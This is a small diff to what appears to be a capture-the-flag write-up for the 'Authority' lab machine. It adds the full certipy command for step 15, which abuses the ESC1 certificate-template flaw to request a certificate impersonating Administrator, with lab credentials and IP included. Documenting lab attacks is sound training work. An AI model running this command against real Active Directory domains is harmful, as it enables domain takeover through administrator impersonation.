@@ -307,4 +307,4 @@ Certificate Templates
 
 15. Use `certipy` to abuse ESC1 vulnerability and get a certificate impersonating Admin
 
-``
+`certipy req -u 'TEST$@authority.htb' -p 'Password!' -dc-ip 10.129.229.56 -ca AUTHORITY-CA -target dc.authority.htb -template CorpVPN -upn 'Administrator@authority.htb'`
